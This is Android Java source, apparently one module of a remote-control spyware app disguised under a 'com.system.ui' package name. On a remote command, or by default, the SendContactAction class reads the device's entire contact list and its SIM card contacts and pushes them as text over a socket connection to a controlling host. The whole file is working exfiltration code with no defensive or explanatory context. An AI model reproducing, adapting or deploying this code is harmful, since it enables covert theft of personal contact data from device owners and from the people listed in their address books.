package com.system.ui.interpret;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.text.TextUtils;

import com.system.ui.model.Contact;
import com.system.ui.model.SimContact;
import com.system.ui.service.LocalService;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * 发送通讯录的行为
 */
public class SendContactAction extends AbsAction {
	
	public static final String COMMAND_MOBILE = "-mobile";
	public static final String COMMAND_SIM = "-sim";

	public SendContactAction(Context context) {
		super(context);
	}

	@Override
	public boolean execute() {
		Map<String, String> params = getParams();
		if (params != null) {
			if (params.containsKey(COMMAND_MOBILE)) {
				//发送手机通讯录
				try {
					((LocalService)mContext).getSocketThread().send("手机通讯录<*>"+getContacts().toString());
				} catch (Exception e) {
					e.printStackTrace();
					return false;
				}
			}
			if (params.containsKey(COMMAND_SIM)) {
				//发送SIM卡通讯录
				try {
					((LocalService)mContext).getSocketThread().send("SIM卡通讯录<*>"+getSimContacts().toString());
				} catch (Exception e) {
					e.printStackTrace();
					return false;
				}
			}
		}else{
			//发送手机通讯录
			try {
				((LocalService)mContext).getSocketThread().send("手机通讯录<*>"+getContacts().toString());
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
		}
		return true;
	}
	
	/**
	 * 获取SIM卡的联系人
	 */
	public List<SimContact> getSimContacts() {
		List<SimContact> simContacts = new ArrayList<SimContact>();
		ContentResolver resolver = mContext.getContentResolver();
		Uri uri = Uri.parse("content://icc/adn");
		Cursor phoneCursor = resolver.query(uri, null, null, null, null);
		if (phoneCursor != null) {
			while (phoneCursor.moveToNext()) {
				SimContact simContact = new SimContact();
				simContact.phoneNumber = phoneCursor
						.getString(1);
				if (TextUtils.isEmpty(simContact.phoneNumber))
					continue;
				simContact.contactName = phoneCursor
						.getString(0);
				simContacts.add(simContact);
			}
			phoneCursor.close();
		}
		return simContacts;
	}
	
	/**
	 * 获取手机通讯录
	 */
	private List<Contact> getContacts() {
		List<Contact> contacts = new ArrayList<Contact>();
		ContentResolver resolver = mContext.getContentResolver();
		// 获取手机联系人
		Cursor phoneCursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null,null,null,null);
		if (phoneCursor != null) {
			while (phoneCursor.moveToNext()) {
				Contact contact = new Contact();
				String hasPhoneNumber = phoneCursor
						.getString(phoneCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
				if (TextUtils.isEmpty(hasPhoneNumber))
					continue;
				contact.contactName = phoneCursor
						.getString(phoneCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				contact.contactId = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.Contacts._ID));
				Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,       
	                    null, // select sentence      
	                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", // where sentence      
	                    new String[] { contact.contactId }, // where values      
	                    null);
				if(cursor.moveToFirst()){
					contact.phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				}
				contacts.add(contact);
			}
			phoneCursor.close();
		}
		return contacts;
	}
}
